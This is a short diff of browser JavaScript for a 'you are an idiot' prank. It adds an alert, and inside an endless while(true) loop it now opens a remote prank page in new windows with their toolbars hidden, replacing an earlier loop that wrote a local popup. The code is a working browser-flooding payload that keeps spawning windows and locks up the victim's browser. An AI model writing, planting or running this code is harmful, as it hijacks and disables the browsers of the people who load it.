@@ -1,4 +1,4 @@
+alert("you are an idiot");
 while (true) {
-            var idiot = window.open("", "idiot", "width=200,height=100");
-            idiot.document.write("<p>you are an idiot</p>");
+            window.open('https://hardwaregore.github.io/you-are-an-idiot', '_blank', 'toolbar=0,location=0,menubar=0');
 }
